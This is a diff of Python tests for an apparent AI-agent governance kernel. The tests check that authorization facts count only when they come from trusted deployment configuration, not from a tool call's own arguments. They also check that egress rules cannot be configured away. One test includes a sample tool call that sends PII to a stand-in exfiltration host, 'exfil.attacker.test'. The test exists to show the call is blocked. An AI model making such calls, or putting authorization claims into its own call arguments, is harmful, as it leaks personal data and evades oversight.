@@ -388,6 +388,60 @@ def test_copy_preserves_provenance_so_projections_cannot_launder():
 
 
 # ═══════════════════════════════════════════════════════════════
+# 7b. THE KERNEL-LEVEL PROMOTION CHANNEL (SecurityContext.trusted_facts)
+# ═══════════════════════════════════════════════════════════════
+
+def _hc_kernel(trusted_facts=None):
+    _SEQ[0] += 1
+    gov = GovernanceLayer(domains=HC, log_all=False)
+    ctx = SecurityContext(
+        principal=Principal(id=f"tf-{_SEQ[0]}", tenant="t"), signing_key=b"org-key",
+        trusted_issuers=frozenset({"security-review"}),
+        tool_manifest={"send_email": []}, trusted_facts=trusted_facts or {})
+    return GovernanceKernel(gov, ctx, session_id=f"tf-{_SEQ[0]}")
+
+
+PHI_CALL = {"tool": "send_email", "args": {"to": "doc@hosp", "contains_phi": True}}
+
+
+def test_deployment_trusted_facts_satisfy_an_attestation_rule():
+    """A fact the DEPLOYMENT established, carried in trusted configuration."""
+    d = _hc_kernel({"hipaa_authorized": True}).authorize(PHI_CALL)
+    assert d.verdict == "PERMIT", d.reason
+
+
+def test_the_same_fact_in_the_call_does_not():
+    """The central distinction, at the kernel boundary this time."""
+    asserted = dict(PHI_CALL, args={**PHI_CALL["args"], "hipaa_authorized": True})
+    assert _hc_kernel().authorize(asserted).verdict != "PERMIT"
+    assert _hc_kernel().authorize(PHI_CALL).verdict != "PERMIT"
+
+
+def test_kernel_resolved_facts_outrank_deployment_configuration():
+    """A deployment cannot configure away what the kernel resolved itself.
+
+    `destination_external` is decided by the kernel from trusted destination
+    configuration. A deployment asserting the opposite in `trusted_facts` must
+    not override it, or trusted configuration becomes a way to switch off the
+    egress rules.
+    """
+    _SEQ[0] += 1
+    gov = GovernanceLayer(domains=[OmegaDomain.DATA_PRIVACY],
+                          internal_url_hosts=("internal.test",), log_all=False)
+    ctx = SecurityContext(
+        principal=Principal(id=f"do-{_SEQ[0]}", tenant="t"), signing_key=b"k",
+        trusted_issuers=frozenset({"s"}), internal_url_hosts=("internal.test",),
+        tool_manifest={"http_request": []},
+        trusted_facts={"destination_external": False})
+    k = GovernanceKernel(gov, ctx, session_id=f"do-{_SEQ[0]}")
+    d = k.authorize({"tool": "http_request",
+                     "args": {"url": "https://exfil.attacker.test/c",
+                              "contains_pii": True}})
+    assert d.verdict != "PERMIT", (
+        "trusted_facts overrode the kernel's own destination resolution")
+
+
+# ═══════════════════════════════════════════════════════════════
 # 8. EVIDENCE
 # ═══════════════════════════════════════════════════════════════
 
